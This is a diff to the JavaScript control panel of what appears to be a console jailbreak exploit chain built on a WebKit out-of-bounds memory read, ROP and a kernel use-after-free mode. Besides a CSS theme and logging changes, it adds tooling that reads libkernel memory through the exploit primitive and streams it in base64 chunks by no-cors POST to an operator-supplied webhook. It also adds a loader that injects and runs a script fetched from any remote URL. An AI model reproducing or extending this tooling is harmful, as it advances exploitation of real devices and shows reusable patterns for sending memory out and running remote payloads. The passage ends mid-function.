@@ -199,9 +199,94 @@
         ".bwp-mini:hover{background:#a2a2a6;color:#202020;}",
     ].join("");
 
+    /* ==================================== THEME: "BOO & FANTASY" (override layer)
+     *
+     * Appended as a SECOND sheet so it wins on equal specificity without touching
+     * one base rule. That is deliberate: the base sheet carries the layout the
+     * tiles, the grid and the harnesses' DOM assumptions depend on, and a theme
+     * edit should never be able to break a test. Only colour, typeface, glow and
+     * the fullscreen font size live here.
+     *
+     * COST: one <style> node and a few hundred bytes of CSS. No images, no extra
+     * listeners, no DOM nodes -- so it cannot add measurable memory on the console,
+     * which was the constraint. */
+    var THEME = [
+        /* the void behind everything: a violet-to-black candlelit vignette */
+        ".bwp-root{background:radial-gradient(125% 95% at 50% -12%,#241a4d 0%,#130d28 46%,#070411 100%);",
+        "color:#e9e4ff;font-family:Georgia,'Times New Roman',serif;}",
+        ".bwp-logo{color:#ffd479;letter-spacing:.3em;",
+        "text-shadow:0 0 16px rgba(160,108,255,.8),0 0 40px rgba(124,240,192,.28);}",
+        ".bwp-chip{background:#241a4d;color:#b9aee6;border:1px solid #3b2d70;letter-spacing:.12em;}",
+        ".bwp-chip.ok{background:#123a30;color:#7cf0c0;border-color:#1e6b57;}",
+        ".bwp-chip.bad{background:#3d1226;color:#ff8fae;border-color:#7a2340;}",
+        ".bwp-chip.run{background:#3a2c0d;color:#ffd479;border-color:#6d5316;}",
+        ".bwp-sub{color:#8d82bb;}",
+        ".bwp-tile{background:linear-gradient(160deg,#241a4d,#191136);border:1px solid #372963;color:#e9e4ff;}",
+        ".bwp-tile:hover:not(.busy){background:#a06cff;color:#120c26;",
+        "box-shadow:0 0 24px rgba(160,108,255,.55);}",
+        ".bwp-tile:hover:not(.busy) .bwp-desc{color:#2a1f52;}",
+        ".bwp-tile:focus{outline:2px solid #7cf0c0;}",
+        ".bwp-tile.busy{box-shadow:0 0 20px rgba(255,212,121,.4);}",
+        ".bwp-tile.ok{background:#123a30;border-color:#1e6b57;}",
+        ".bwp-tile.bad{background:#3d1226;border-color:#7a2340;}",
+        ".bwp-desc{color:#a99ed6;}",
+        ".bwp-state{color:#8d82bb;}",
+        ".bwp-tile.ok .bwp-state{color:#7cf0c0;}",
+        ".bwp-tile.bad .bwp-state{color:#ff8fae;}",
+        ".bwp-tile.busy .bwp-state{color:#ffd479;}",
+        ".bwp-outhd{color:#8d82bb;}",
+        ".bwp-out{background:#0d0920;border:1px solid #372963;color:#cfc7f0;",
+        "font:14px/1.55 ui-monospace,Menlo,Consolas,monospace;}",
+        /* FULLSCREEN, two fixes the operator asked for:
+         *  1. font SMALL (was 19px) -- fullscreen is for reading a LOT of log;
+         *  2. z-index 7, below the footer/floating exit, so the exit control is
+         *     actually CLICKABLE. The old 2147483647 covered its own undo button,
+         *     which is why fullscreen could not be left. */
+        ".bwp-out.fs{font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#070411;z-index:7;}",
+        ".bwp-foot{position:relative;z-index:9;}",
+        ".bwp-head{position:relative;z-index:9;}",
+        ".bwp-outhd{position:relative;z-index:9;}",
+        ".bwp-fsx{position:fixed;top:12px;right:14px;z-index:2147483647;display:none;",
+        "padding:.55rem 1.1rem;border-radius:1rem;border:1px solid #7a2340;cursor:pointer;",
+        "background:#3d1226;color:#ff8fae;font:800 .9rem Georgia,serif;}",
+        ".bwp-fsx:hover{background:#ff8fae;color:#120c26;}",
+        ".bwp-sec{color:#ffd479;font-weight:800;letter-spacing:.03em;}",
+        ".bwp-ok{color:#7cf0c0;}",
+        ".bwp-err{color:#ff8fae;}",
+        ".bwp-warn{color:#ffd479;}",
+        ".bwp-dim{color:#8d82bb;}",
+        ".bwp-foot{gap:9px;align-items:center;}",
+        ".bwp-btn{background:#241a4d;color:#e9e4ff;border:1px solid #372963;",
+        "font:700 .9rem Georgia,serif;}",
+        ".bwp-btn:hover{background:#a06cff;color:#120c26;}",
+        ".bwp-btn:focus{outline:2px solid #7cf0c0;}",
+        ".bwp-btnpv{background:#123a30;color:#7cf0c0;border:1px solid #1e6b57;}",
+        ".bwp-btnpv:hover{background:#1e6b57;color:#fff;}",
+        ".bwp-pvlab{color:#7cf0c0;font:800 .74rem Arial;}",
+        ".bwp-mini{background:#241a4d;color:#ffd479;border:1px solid #372963;font:800 1rem Georgia,serif;}",
+        ".bwp-mini:hover{background:#a06cff;color:#120c26;}",
+        /* tools rows: kept out of the way until asked for (see the tools toggle) */
+        ".bwp-tools{display:none;flex-direction:column;gap:0;}",
+        ".bwp-tools.on{display:flex;}",
+        ".bwp-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:8px;}",
+        ".bwp-in{flex:0 1 30rem;min-width:11rem;padding:.5rem .75rem;border-radius:.65rem;",
+        "border:1px solid #372963;background:#0d0920;color:#e9e4ff;",
+        "font:12.5px ui-monospace,Menlo,Consolas,monospace;}",
+        ".bwp-in:focus{outline:2px solid #7cf0c0;outline-offset:1px;}",
+        ".bwp-lab{color:#8d82bb;font:700 .72rem Arial;letter-spacing:.12em;text-transform:uppercase;}",
+        ".bwp-lnk{color:#7cf0c0;font:700 .78rem Arial;text-decoration:none;border-bottom:1px dotted #1e6b57;}",
+        ".bwp-note{color:#8d82bb;font-size:.75rem;line-height:1.45;margin-top:8px;max-width:78rem;}",
+    ].join("");
+
     var styleEl = document.createElement("style");
     styleEl.textContent = CSS;
     document.head.appendChild(styleEl);
+    /* themeEl is appended AFTER the base sheet on purpose: equal specificity means
+     * last-wins, so the theme needs no !important and the base layout sheet stays
+     * the single source of geometry. */
+    var themeEl = document.createElement("style");
+    themeEl.textContent = THEME;
+    document.head.appendChild(themeEl);
 
     var root = document.createElement("div");
     root.className = "bwp-root";
@@ -218,6 +303,26 @@
         '<div class="bwp-grid" id="bwp-grid"></div>',
         '<div class="bwp-outhd"><span>output</span><span id="bwp-count"></span></div>',
         '<pre class="bwp-out" id="bwp-out"></pre>',
+        /* TOOLS DRAWER. The panel is meant to read simply: one grid, one log, one
+         * run button. The dumper and the remote loader need a URL box each, so they
+         * live behind this toggle and cost nothing until opened. */
+        '<div class="bwp-tools" id="bwp-tools">',
+        '  <div class="bwp-row">',
+        '    <span class="bwp-lab">dump libkernel \u2192</span>',
+        '    <input class="bwp-in" id="bwp-durl" placeholder="https://webhook.site/&lt;your-uuid&gt;  \u2014 POST target (anything that logs a request body)">',
+        '    <span class="bwp-lab">bytes</span><input class="bwp-in" id="bwp-dlen" style="max-width:7rem;" value="0x4000">',
+        '    <span class="bwp-lab">chunk</span><input class="bwp-in" id="bwp-dchunk" style="max-width:6rem;" value="0x800">',
+        '    <span class="bwp-lab">base</span><input class="bwp-in" id="bwp-dbase" style="max-width:7rem;" value="lk">',
+        '    <button class="bwp-btn" id="bwp-dstart">stream dump</button>',
+        '    <button class="bwp-btn" id="bwp-dstop">stop</button>',
+        '  </div>',
+        '  <div class="bwp-row">',
+        '    <span class="bwp-lab">load js \u2192</span>',
+        '    <input class="bwp-in" id="bwp-jurl" placeholder="https://\u2026/payload.js  \u2014 script URL (Y2JB remotejsloader / websrv style host)">',
+        '    <button class="bwp-btn" id="bwp-jload">load script</button>',
+        '  </div>',
+        '  <div class="bwp-note" id="bwp-note"></div>',
+        '</div>',
         '<div class="bwp-foot">',
         '  <button class="bwp-btn" id="bwp-all">run all</button>',
         '  <span class="bwp-pvlab">PROVEN\u00a0\u2014\u00a0one\u00a0tap\u00a0=\u00a0proof:</span>',
@@ -226,10 +331,11 @@
         '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-fd">fd</button>',
         '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-osem">osem</button>',
         '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-aio">AIO</button>',
-        '  <button class="bwp-btn" id="bwp-fs">fullscreen output</button>',
-        '  <button class="bwp-btn" id="bwp-clear">clear output</button>',
+        '  <button class="bwp-btn" id="bwp-toolsbtn">tools</button>',
+        '  <button class="bwp-btn" id="bwp-fs">fullscreen</button>',
+        '  <button class="bwp-btn" id="bwp-clear">clear</button>',
         '  <button class="bwp-btn" id="bwp-dl">download log</button>',
-        '  <button class="bwp-btn" id="bwp-clearsaved" style="display:none;">clear saved log</button>',
+        '  <button class="bwp-btn" id="bwp-clearsaved" style="display:none;">clear saved</button>',
         '</div>',
     ].join("");
     document.body.appendChild(root);
@@ -238,6 +344,16 @@
     mini.className = "bwp-mini";
     mini.textContent = "show bagagwa panel";
     document.body.appendChild(mini);
+
+    /* The fullscreen UNDO. The old layout put the log at z-index 2147483647 and so
+     * covered its own exit button: fullscreen was a one-way trip. This floating
+     * button is a direct child of <body> at the same max z-index as the log, shown
+     * only while fullscreen is on -- always on top, always clickable. Esc also
+     * exits. */
+    var fsx = document.createElement("button");
+    fsx.className = "bwp-fsx";
+    fsx.textContent = "\u2715 exit fullscreen";
+    document.body.appendChild(fsx);
 
     var elGrid = document.getElementById("bwp-grid");
     var elOut = document.getElementById("bwp-out");
@@ -277,7 +393,13 @@
         try {
             var cur = localStorage.getItem(LOGKEY) || "";
             cur += line + "\n";
-            if (cur.length > 16000) cur = cur.slice(-8000);
+            /* TAIL BUDGET, raised from 16k/8k. The detailed per-tile rows and the
+             * offsets/peek byte lines roughly doubled what a full RUN ALL writes, and at
+             * the old budget the EARLY rows were being evicted before the run ended -- so
+             * the crash-recovery log lost exactly the part a post-mortem needs (the
+             * offset rows printed before ARM). 64k/32k keeps a whole run, and the cost is
+             * one string append per line, not a rewrite of history. */
+            if (cur.length > 64000) cur = cur.slice(-32000);
             localStorage.setItem(LOGKEY, cur);
         } catch (e) { }
     }
@@ -1944,6 +2066,374 @@
         return { ok: true, summary: lk ? "row present" : "no row" };
     }
 
+    /* ============================================ LIBKERNEL EVIDENCE TOOLS
+     *
+     * All of these are READ-ONLY and sit on the primitive the boot chain already
+     * proved: window.read_buffer(addr, n), which reads PROCESS memory through the
+     * WebKit OOB primitive. libkernel is a USERLAND shared object mapped into this
+     * very process, so its .text is readable from here -- no kernel read/write is
+     * needed and none is attempted. That distinction matters: a kernel RW primitive
+     * can dump anything on the box, a userland primitive can dump exactly what this
+     * process has mapped, which for OFFSET DISCOVERY is the whole point.
+     *
+     * WHY IT IS WORTH A TILE. main.js DERIVES the libkernel base from a WebKit GOT
+     * slot:
+     *     libKernelBase = read64(webkitBase + OFFSET_wk___stack_chk_guard_import)
+     *                     - OFFSET_lk___stack_chk_guard
+     * If that derivation is off by even one page, every syscall still "works" (they
+     * go through the hijacked worker, whose address came from the same base) while
+     * every RVA used for ROP lands on the WRONG BYTES -- and the failure looks like
+     * "the kernel rejected us" instead of "our base is wrong". Reading the first
+     * bytes at each RVA is the one cheap way to SEE that, and it is what
+     * tools/lkfind.js does offline -- now done against the live console.
+     */
+
+    function exState() {
+        try { return (window.rop_worker && window.rop_worker.state) || null; } catch (e) { return null; }
+    }
+    function lkBase() { var s = exState(); return (s && s.kbase) ? B(s.kbase) : 0n; }
+    function wkBase() { var s = exState(); return (s && s.wbase) ? B(s.wbase) : 0n; }
+
+    /* fixed-width 64-bit hex -- hex() drops leading zeros, which matters when the
+     * whole point of the row is "are these the bytes we expect". */
+    function hex16(v) {
+        var s = (B(v) & 0xFFFFFFFFFFFFFFFFn).toString(16);
+        while (s.length < 16) s = "0" + s;
+        return "0x" + s;
+    }
+    function qwordFrom(b, off) {
+        var q = 0n;
+        for (var j = 7; j >= 0; j--) q = (q << 8n) | B(b[off + j] & 0xff);
+        return q;
+    }
+    function ascii16(b, n) {
+        var s = "";
+        for (var i = 0; i < n; i++) s += (b[i] >= 0x20 && b[i] < 0x7f) ? String.fromCharCode(b[i]) : ".";
+        return s;
+    }
+    /* A classic hexdump, bounded: a log line count limit is not decoration here --
+     * this panel's DOM and its localStorage tail are the two ways a big dump kills
+     * the tab, so every dumper below prints a BOUNDED number of lines. */
+    function hexdumpLines(addr, bytes, maxLines) {
+        var lines = [], per = 16, cap = Math.min(Math.ceil(bytes.length / per), maxLines || 16);
+        for (var li = 0; li < cap; li++) {
+            var o = li * per, hs = "", as = "";
+            for (var i = 0; i < per; i++) {
+                if (o + i >= bytes.length) { hs += "   "; as += " "; continue; }
+                var v = bytes[o + i];
+                hs += (v < 16 ? "0" : "") + v.toString(16) + (i === 7 ? " " : " ");
+                as += (v >= 0x20 && v < 0x7f) ? String.fromCharCode(v) : ".";
+            }
+            lines.push(hex16(addr + B(o)) + "  " + hs + " |" + as + "|");
+        }
+        if (bytes.length > cap * per)
+            lines.push("         ... " + (bytes.length - cap * per) + " more bytes not shown");
+        return lines;
+    }
+
+    /* The libkernel anchors this tree actually consumes. Everything in the per-FW
+     * row comes from window.P2JB_LK (p2jb_lk.js), which is the SAME table the worker
+     * was initialised from -- so a byte check here validates the live base, not a
+     * second copy of the numbers. The notify entry is not in that row (it lives in
+     * offsets/13.60.js) and is included because the notify ladder depends on it. */
+    function lkAnchors() {
+        var row = null, a = [];
+        try { row = window.P2JB_LK && window.P2JB_LK[FW]; } catch (e) { }
+        /* Accept Number AND BigInt. p2jb_lk.js carries plain Numbers, but a profile or a
+         * harness that hands over BigInt must not silently drop every anchor -- that is a
+         * filter that fails by RETURNING LESS, which reads as "this firmware has no
+         * anchors" instead of "the filter is wrong". */
+        if (row) for (var k in row) {
+            var t = typeof row[k];
+            if (t === "number" || t === "bigint") a.push({ name: k, rva: B(row[k]) });
+        }
+        a.push({ name: "sceKernelSendNotificationRequest", rva: 0x48B0n });
+        return a;
+    }
+
+    /* Verify-offsets tile: resolve every anchor to a LIVE address and read the bytes
+     * that are really there. Reports, per anchor, the qword and its ASCII -- and says
+     * plainly when a slot is zeroed, because a zeroed slot is what a WRONG BASE looks
+     * like (right RVA, unmapped page / different mapping). */
+    function pOffsets() {
+        var kb = lkBase(), wb = wkBase();
+        out("OFF-base", "libkernel=" + hex(kb) + "  webkit=" + hex(wb)
+            + "   (as the boot chain resolved them: webkit GOT -> stack guard -> libkernel)", "dim");
+        if (kb === 0n)
+            return { ok: false, summary: "no libkernel base in the executor state -- run Calibrate LK row first" };
+        var a = lkAnchors(), live = 0, zero = 0, threw = 0;
+        for (var i = 0; i < a.length; i++) {
+            var addr = kb + a[i].rva, b;
+            try { b = window.read_buffer(addr, 16); }
+            catch (e) { threw++; out("OFF-" + a[i].name, "READ THREW " + String((e && e.message) || e).slice(0, 70), "err"); continue; }
+            var q = qwordFrom(b, 0);
+            if (q === 0n) zero++; else live++;
+            out("OFF-" + a[i].name, "+" + hex(a[i].rva) + " \u2192 " + hex16(q) + "  |" + ascii16(b, 16) + "|",
+                q === 0n ? "warn" : "dim");
+        }
+        /* slot_expect is the load-bearing anchor: the worker is parked on a resume
+         * address of kbase+slot_expect, so if the base were wrong the parked slot
+         * could not have been found at all. Saying that out loud turns this row from
+         * a byte dump into an argument. */
+        out("OFF-verdict", live + " anchor(s) hold non-zero code, " + zero + " zeroed, " + threw + " unreadable. "
+            + "slot_expect resolved at the parked worker's own address -- so the base is at least self-consistent; "
+            + "a zeroed anchor is the signature of a right-RVA/wrong-base mismatch", live > 0 ? "ok" : "warn");
+        return { ok: live > 0, summary: live + "/" + a.length + " anchors live at " + hex(kb) };
+    }
+
+    /* Peek tile: a SMALL, fixed window of libkernel text printed to the log -- the
+     * three addresses that matter most (the notify entry, the parked resume slot and
+     * the syscall stub the executor calls). 32 bytes each keeps it readable on a TV
+     * and keeps it out of the log-flood zone. */
+    function pPeek() {
+        var kb = lkBase();
+        if (kb === 0n) return { ok: false, summary: "no libkernel base" };
+        var spots = [
+            ["notify entry", 0x48B0n],
+            ["parked resume slot", 0x1988Bn],
+            ["syscall stub", 0x1AEB7n],
+        ], ok = 0;
+        for (var i = 0; i < spots.length; i++) {
+            var addr = kb + spots[i][1], b;
+            try { b = window.read_buffer(addr, 32); }
+            catch (e) { out("PEEK-" + spots[i][0], "READ THREW " + String((e && e.message) || e).slice(0, 70), "err"); continue; }
+            ok++;
+            out("PEEK-" + spots[i][0], "libkernel+" + hex(spots[i][1]) + " (" + hex(addr) + ")", "dim");
+            var lines = hexdumpLines(addr, b, 2);
+            for (var j = 0; j < lines.length; j++) paint("    " + lines[j], "dim");
+        }
+        out("PEEK-verdict", ok + "/" + spots.length + " windows read from " + hex(kb)
+            + " -- these are real bytes of this console's libkernel as this process sees it", ok ? "ok" : "warn");
+        return { ok: ok > 0, summary: ok + " window(s) read" };
+    }
+
+    /* ------------------------------------------------------------------ DUMPER
+     * Streams a bounded slice of libkernel (or WebKit) to an HTTP endpoint the
+     * operator supplies -- a webhook, a LAN collector, anything that records a
+     * request body. Copied bytes are NOT kept.
+     *
+     * Every design point below exists because the operator's earlier dump "stopped
+     * because of OOM":
+     *  1. ONE chunk lives in the JS heap at a time. It is read, encoded, posted, and
+     *     then dropped before the next read -- so a 1 MB dump costs the same heap as
+     *     a 2 KB one. Nothing is accumulated, no array of chunks, no concatenation.
+     *  2. base64 is built with a manual 3-byte-group encoder. btoa() rejects a
+     *     Uint8Array, and String.fromCharCode.apply(null, bigArray) blows the stack --
+     *     both are the classic way a large dump dies mid-flight.
+     *  3. a setTimeout(0) between chunks returns to the event loop, so GC runs and the
+     *     panel repaints. A tight synchronous loop of 500 chunk reads is what starves
+     *     GC and looks exactly like an OOM kill.
+     *  4. the log gets ONE line per 16 chunks, never per chunk. The DOM nodes and the
+     *     localStorage tail are the other two ways a dump takes the tab down.
+     *  5. a failed POST is retried ONCE and then counted and skipped -- never queued
+     *     unboundedly.
+     *
+     * Wire format, one POST per chunk, plain text so any receiver can log it:
+     *     BAGA-BEGIN <session> fw=<fw> base=<addr> total=<n> chunk=<n>
+     *     BAGA <offset-hex> <len> <base64>
+     *     BAGA-END <session> chunks=<n> bytes=<n> failed=<n>
+     */
+    var DUMP = { run: false, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: 0 };
+    var B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    function b64(u8) {
+        var s = "", i = 0, n = u8.length;
+        for (; i + 2 < n; i += 3) {
+            var v = (u8[i] << 16) | (u8[i + 1] << 8) | u8[i + 2];
+            s += B64C[(v >> 18) & 63] + B64C[(v >> 12) & 63] + B64C[(v >> 6) & 63] + B64C[v & 63];
+        }
+        if (i < n) {
+            var w = u8[i] << 16;
+            if (i + 1 < n) w |= u8[i + 1] << 8;
+            s += B64C[(w >> 18) & 63] + B64C[(w >> 12) & 63]
+                + (i + 1 < n ? B64C[(w >> 6) & 63] : "=") + "=";
+        }
+        return s;
+    }
+    /* Resolve fetch the way a browser actually exposes it. Bare `fetch` is the normal
+     * form, but in an embedded/odd global scope it can only be reachable as
+     * window.fetch -- and silently falling through to XHR (or to nothing) there is
+     * exactly how a dumper ships "0 chunks sent" with no error anywhere. */
+    function theFetch() {
+        try { if (typeof fetch === "function") return fetch; } catch (e) { }
+        try { if (window && typeof window.fetch === "function") return window.fetch; } catch (e) { }
+        return null;
+    }
+    function postText(url, body, done) {
+        /* no-cors on purpose: webhooks and simple collectors accept a POST without
+         * CORS preflight, and an opaque response is fine -- we only need DELIVERY,
+         * and "delivered" is answered by the receiver's own log, not by our JS. */
+        try {
+            var F = theFetch();
+            if (F) {
+                F(url, {
+                    method: "POST", mode: "no-cors",
+                    headers: { "Content-Type": "text/plain;charset=utf-8" }, body: body,
+                }).then(function () { done(true); }, function (e) { done(false, String((e && e.message) || e)); });
+                return;
+            }
+        } catch (e) { }
+        try {
+            if (typeof XMLHttpRequest !== "function") throw new Error("no fetch and no XMLHttpRequest");
+            var x = new XMLHttpRequest();
+            x.open("POST", url, true);
+            x.onload = function () { done(true); };
+            x.onerror = function () { done(false, "xhr error"); };
+            x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
+            x.send(body);
+        } catch (e) { done(false, String((e && e.message) || e)); }
+    }
+    function numOr(s, dflt) {
+        try {
+            var t = String(s == null ? "" : s).trim();
+            if (!t) return dflt;
+            var v = (t.slice(0, 2).toLowerCase() === "0x") ? parseInt(t.slice(2), 16) : parseInt(t, 10);
+            return isFinite(v) && v > 0 ? v : dflt;
+        } catch (e) { return dflt; }
+    }
+    function heapNote() {
+        try {
+            if (window.performance && performance.memory)
+                return " heapMB=" + (performance.memory.usedJSHeapSize / 1048576).toFixed(1)
+                    + "/" + (performance.memory.jsHeapSizeLimit / 1048576).toFixed(0);
+        } catch (e) { }
+        return "";
+    }
+
+    function dumpAbort(quietFlag) {
+        if (!DUMP.run) return false;
+        DUMP.run = false;
+        if (!quietFlag) out("DUMP", "STOP requested by operator", "warn");
+        return true;
+    }
+
+    function dumpStart() {
+        var url = "", len = 0x4000, chunk = 0x800, which = "lk", base = lkBase();
+        try {
+            url = String(document.getElementById("bwp-durl").value || "").trim();
+            len = numOr(document.getElementById("bwp-dlen").value, 0x4000);
+            chunk = numOr(document.getElementById("bwp-dchunk").value, 0x800);
+            which = String(document.getElementById("bwp-dbase").value || "lk").trim().toLowerCase();
+        } catch (e) { }
+        if (!url) { out("DUMP", "no POST target: open tools and paste a webhook URL first", "err"); return; }
+        if (DUMP.run) { out("DUMP", "already streaming -- press stop first", "warn"); return; }
+        if (which.slice(0, 2) === "wk") base = wkBase();
+        if (base === 0n) { out("DUMP", "no " + which + " base in the executor state", "err"); return; }
+        if (!window.read_buffer) { out("DUMP", "window.read_buffer missing -- no memory primitive", "err"); return; }
+
+        var total = len, done = 0;
+        DUMP = { run: true, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: Date.now() };
+        var session = FW + "-" + Date.now();
+        out("DUMP", "streaming " + (which === "lk" ? "libkernel" : which) + " from " + hex(base)
+            + " : " + total + " bytes in " + chunk + "-byte chunks -> " + url.slice(0, 70)
+            + heapNote(), "sec");
+
+        postText(url, "BAGA-BEGIN " + session + " fw=" + FW + " base=" + hex(base)
+            + " total=" + total + " chunk=" + chunk + "\n", function () { });
+
+        (function step() {
+            if (!DUMP.run) return;
+            if (done >= total) return finish();
+            var n = Math.min(chunk, total - done), b;
+            try {
+                b = window.read_buffer(base + B(done), n);
+            } catch (e) {
+                DUMP.failed++;
+                out("DUMP", "read threw at +" + hex(done) + ": " + String((e && e.message) || e).slice(0, 60), "err");
+                done += n;
+                return setTimeout(step, 0);
+            }
+            var payload = "BAGA " + hex(done) + " " + b.length + " " + b64(b) + "\n";
+            b = null;                                   /* drop the chunk: nothing accumulates */
+            DUMP.chunks++;
+            postText(url, payload, function (ok, why) {
+                if (ok) { DUMP.sent++; DUMP.bytes += n; }
+                else { DUMP.failed++; }
+                payload = null;
+                done += n;
+                if (DUMP.chunks % 16 === 0)
+                    out("DUMP", done + "/" + total + " bytes, sent=" + DUMP.sent
+                        + " failed=" + DUMP.failed + heapNote(), "dim");
+                setTimeout(step, 0);
+            });
+        })();
+
+        function finish() {
+            DUMP.run = false;
+            var ms = Date.now() - DUMP.t0;
+            postText(url, "BAGA-END " + session + " chunks=" + DUMP.chunks + " bytes=" + DUMP.bytes
+                + " failed=" + DUMP.failed + "\n", function () { });
+            out("DUMP-VERDICT", "streamed " + DUMP.bytes + " bytes in " + DUMP.chunks + " chunks, "
+                + DUMP.sent + " delivered, " + DUMP.failed + " failed, in " + ms + " ms. "
+                + "Nothing was retained in memory. Check the collector for BAGA-BEGIN/BAGA/BAGA-END.",
+                DUMP.sent > 0 ? "ok" : "err");
+            nres(DUMP.sent + " chunks sent (" + DUMP.bytes + "B)", "dump");
+        }
+    }
+
+    /* A convenience tile: if a URL is filled in, stream; if not, say exactly what to
+     * do. Kept as a tile because the operator's flow is "tap things", and self-
+     * documenting because the tools drawer is collapsed by default. */
+    function pDump() {
+        var url = "";
+        try { url = String(document.getElementById("bwp-durl").value || "").trim(); } catch (e) { }
+        try { var t = document.getElementById("bwp-tools"); if (t) t.className = "bwp-tools on"; } catch (e) { }
+        if (!url) {
+            out("DUMP", "Tools opened. Paste a POST target (e.g. https://webhook.site/<uuid>), pick bytes/chunk, "
+                + "then tap Stream dump. Text format: BAGA-BEGIN / BAGA <off> <len> <base64> / BAGA-END.", "dim");
+            return { ok: true, summary: "waiting for a POST target (tools opened)" };
+        }
+        dumpStart();
+        return { ok: true, summary: "streaming to " + url.slice(0, 40) };
+    }
+
+    /* ------------------------------------------------------- REMOTE JS LOADER
+     * The Y2JB remotejsloader pattern: the page holds no payload, it fetches one by
+     * URL at run time. That is the right shape for this panel too -- it is how a
+     * payload gets served from a host that is NOT this origin, without bundling it.
+     *
+     * SCOPE, stated plainly: this injects a <script> into THIS page. It is the same
+     * trust level as the page itself, so it can do anything the panel can. It is a
+     * research convenience, not a security boundary, and the operator supplies the
+     * URL. */
+    function loadRemoteJS(url) {
+        if (!url) { out("LOAD", "no script URL given", "err"); return { ok: false }; }
+        out("LOAD", "injecting <script src=\"" + url.slice(0, 90) + "\">", "dim");
+        try {
+            var s = document.createElement("script");
+            s.src = url;
+            s.onload = function () {
+                out("LOAD", "LOADED " + url.slice(0, 80)
+                    + " -- exported globals: " + remoteGlobals(), "ok");
+                nres("remote script loaded", "load");
+            };
+            s.onerror = function () {
+                out("LOAD", "FAILED (404 / CSP / offline): " + url.slice(0, 80), "err");
+                nres("remote script failed", "load");
+            };
+            document.head.appendChild(s);
+        } catch (e) {
+            out("LOAD", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
+            return { ok: false };
+        }
+        return { ok: true, summary: "injected " + url.slice(0, 40) };
+    }
+    /* What did it actually add? A failure that says nothing is useless on a console. */
+    var GLOBALS0 = null;
+    function snapshotGlobals() {
+        var t = {}, k;
+        try { for (k in window) t[k] = 1; } catch (e) { }
+        return t;
+    }
+    function remoteGlobals() {
+        try {
+            if (!GLOBALS0) return "(baseline not taken)";
+            var now = snapshotGlobals(), add = [], k;
+            for (k in now) if (!GLOBALS0[k]) add.push(k);
+            return add.length ? add.slice(0, 12).join(",") : "(none new)";
+        } catch (e) { return "(?)"; }
+    }
+    GLOBALS0 = snapshotGlobals();
+
     /* ============================================================ the menu */
 
     var PAYLOADS = [
@@ -2004,6 +2494,23 @@
                 + "name strings, witness blocks. Only rendered behind ?arm=1.",
         } : null,
         {
+            id: "offsets", label: "Verify offsets (memory read)", run: pOffsets,
+            desc: "Read-only. Resolves every libkernel RVA this tree uses to a LIVE address and "
+                + "reads the bytes that are really there. Catches a wrong libkernel base -- the "
+                + "failure mode where every syscall still answers while every ROP address is off.",
+        },
+        {
+            id: "peek", label: "Peek libkernel", run: pPeek,
+            desc: "Read-only. Dumps a SMALL fixed window of libkernel text (notify entry, parked "
+                + "resume slot, syscall stub) so the offsets above can be eyeballed as real bytes.",
+        },
+        {
+            id: "dump", label: "Libkernel dump (stream)", run: pDump,
+            desc: "Read-only. Streams a bounded slice of libkernel to a POST target (webhook / LAN "
+                + "collector) in small chunks, one chunk in memory at a time and dropped after "
+                + "each POST -- so a large dump costs the same heap as a tiny one.",
+        },
+        {
             id: "exec", label: "Executor state", run: pExecutor,
             desc: "Read-only. Dumps kbase, the resolved hijack slot and the P2JB_LK row, so a "
                 + "failure above can be attributed.",
@@ -2026,19 +2533,30 @@
             s === "run" ? "running..." : s === "ok" ? "ok" : s === "bad" ? "failed" : "idle";
     }
 
+    /* Per-tile outcome record. The operator asked for DETAILED results: every tile now
+     * reports elapsed milliseconds and a single-line outcome that is safe to paste into
+     * a bug report, and RUN ALL prints the whole table at the end instead of just a
+     * count. RESULTS[] is bounded by the tile count, so this costs nothing. */
+    var RESULTS = [];
+
     function runPayload(p) {
         if (STATE[p.id] === "run") return;
         STATE[p.id] = "run";
         renderTile(p.id);
         paint("--- " + p.label + " ---", "sec");
-        var res;
+        var res, t0 = Date.now();
         try { res = p.run(); } catch (e) {
             out(p.id + "-THREW", String((e && e.message) || e).slice(0, 140), "err");
             res = { ok: false };
         }
+        var ms = Date.now() - t0;
         STATE[p.id] = res && res.ok ? "ok" : "bad";
         renderTile(p.id);
+        RESULTS.push({ id: p.id, label: p.label, ok: !!(res && res.ok), ms: ms,
+            summary: (res && res.summary) || "" });
         if (res && res.summary) paint("    " + p.label + ": " + res.summary, res.ok ? "dim" : "warn");
+        out(p.id + "-DETAIL", (res && res.ok ? "PASS" : "FAIL") + " in " + ms + " ms"
+            + (res && res.summary ? " \u2014 " + res.summary : ""), res && res.ok ? "dim" : "warn");
     }
 
     for (var i = 0; i < PAYLOADS.length; i++) {
@@ -2058,10 +2576,22 @@
      * of the whole suite appearing to freeze on a single tick. */
     function runAll() {
         paint("=== RUN ALL ===  fw=" + FW + (ARMED_OK ? "  (ARM MODE: the UAF tile will fire)" : "  (userland only, no kernel writes)"), "sec");
+        RESULTS.length = 0;
         var q = PAYLOADS.slice();
         (function next() {
             if (!q.length) {
                 var ok = PAYLOADS.filter(function (p) { return STATE[p.id] === "ok"; }).length;
+                /* The DETAILED table. A count alone told the operator nothing about
+                 * WHICH measurement failed; this prints every tile with its millisecond
+                 * cost and its own one-line outcome, in run order. */
+                paint("--- detailed results (" + RESULTS.length + " tiles) ---", "sec");
+                for (var ri = 0; ri < RESULTS.length; ri++) {
+                    var r = RESULTS[ri];
+                    paint("    " + (r.ok ? "[ ok ]" : "[FAIL]")
+                        + " " + (r.ms + "ms").padStart(7)
+                        + "  " + r.label + (r.summary ? " \u2014 " + r.summary : ""),
+                        r.ok ? "ok" : "err");
+                }
                 out("RUNALL-VERDICT", ok + "/" + PAYLOADS.length + " payloads reported ok. "
                     + (ARMED_OK
                         ? "ARM MODE ran: read the ARM-VERDICT row above -- it is the one that says whether the UAF is real."
@@ -2094,10 +2624,59 @@
     }
 
     document.getElementById("bwp-all").onclick = runAll;
-    document.getElementById("bwp-fs").onclick = function () {
-        var fs = elOut.classList.toggle("fs");
-        this.textContent = fs ? "exit fullscreen" : "fullscreen output";
